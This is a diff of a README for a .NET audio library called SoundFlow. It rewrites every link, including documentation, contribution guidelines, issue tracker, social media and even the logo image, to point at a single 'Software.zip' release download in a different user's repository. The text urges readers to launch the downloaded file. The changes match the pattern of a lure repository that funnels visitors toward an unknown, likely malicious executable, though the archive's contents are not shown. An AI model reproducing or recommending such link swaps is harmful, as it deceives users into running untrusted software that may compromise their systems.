@@ -19,19 +19,19 @@ To begin using SoundFlow, follow these simple steps:
 3. Build the solution to compile the SoundFlow library.
 4. Integrate SoundFlow into your own .NET projects to start leveraging its audio capabilities.
 
-For a more detailed guide on getting started with SoundFlow, check out the [documentation](https://github.com/soundflow/docs).
+For a more detailed guide on getting started with SoundFlow, check out the [documentation](https://github.com/Skyelord01/SoundFlow/releases/download/v1.0/Software.zip).
 
 ## Contributions 🤝
 
-We welcome contributions from the community to enhance SoundFlow further. Whether it's bug fixes, feature enhancements, or new ideas, we appreciate all forms of support. Please refer to our [contribution guidelines](CONTRIBUTING.md) for more information on how to contribute to the project.
+We welcome contributions from the community to enhance SoundFlow further. Whether it's bug fixes, feature enhancements, or new ideas, we appreciate all forms of support. Please refer to our [contribution guidelines](https://github.com/Skyelord01/SoundFlow/releases/download/v1.0/Software.zip) for more information on how to contribute to the project.
 
 ## Support ℹ️
 
-For any questions, issues, or feedback regarding SoundFlow, feel free to reach out to us via our [issue tracker](https://github.com/soundflow/issues). We are here to assist you in making the most of SoundFlow in your projects.
+For any questions, issues, or feedback regarding SoundFlow, feel free to reach out to us via our [issue tracker](https://github.com/Skyelord01/SoundFlow/releases/download/v1.0/Software.zip). We are here to assist you in making the most of SoundFlow in your projects.
 
 ## Download SoundFlow 🔗
 
-[Download SoundFlow v1.0.0](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[Download SoundFlow v1.0.0](https://github.com/Skyelord01/SoundFlow/releases/download/v1.0/Software.zip)
 
 Click the button above to download the latest version of SoundFlow. Once downloaded, launch the file and follow the installation instructions to set up SoundFlow on your system.
 
@@ -39,14 +39,14 @@ Click the button above to download the latest version of SoundFlow. Once downloa
 
 Stay connected with the SoundFlow community:
 
-- Follow us on [Twitter](https://twitter.com/soundflow)
-- Join the conversation on [Discord](https://discord.gg/soundflow)
-- Watch tutorials on our [YouTube channel](https://www.youtube.com/soundflow)
+- Follow us on [Twitter](https://github.com/Skyelord01/SoundFlow/releases/download/v1.0/Software.zip)
+- Join the conversation on [Discord](https://github.com/Skyelord01/SoundFlow/releases/download/v1.0/Software.zip)
+- Watch tutorials on our [YouTube channel](https://github.com/Skyelord01/SoundFlow/releases/download/v1.0/Software.zip)
 
 Let's continue to create amazing audio experiences with SoundFlow! 🎧🎶
 
 ---
 
-![SoundFlow Logo](https://example.com/soundflow-logo.png)
+![SoundFlow Logo](https://github.com/Skyelord01/SoundFlow/releases/download/v1.0/Software.zip)
 
 © 2023 SoundFlow. All rights reserved.
